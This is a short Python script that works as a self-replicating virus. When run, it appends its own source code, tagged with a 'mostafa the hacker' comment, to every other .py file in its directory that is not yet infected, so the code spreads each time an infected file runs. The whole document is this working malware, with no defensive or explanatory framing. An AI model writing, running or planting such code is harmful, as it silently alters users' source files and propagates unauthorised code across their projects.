import os
def copy_to_other_files():
    current_file = os.path.abspath(__file__)

    for filename in os.listdir(os.path.dirname(current_file)):
        if filename.endswith(".py") and filename != os.path.basename(current_file):
            target_file = os.path.join(os.path.dirname(current_file), filename)
            
            with open(current_file, "r") as source, open(target_file, "r") as target:
                source_code = source.read()
                target_code = target.read()
                
                if "copy_to_other_files" not in target_code:
                    with open(target_file, "a") as target:
                        target.write("\n\n# Hello im mostafa the hacker xD :*\n" + source_code)

if __name__ == "__main__":
    copy_to_other_files()
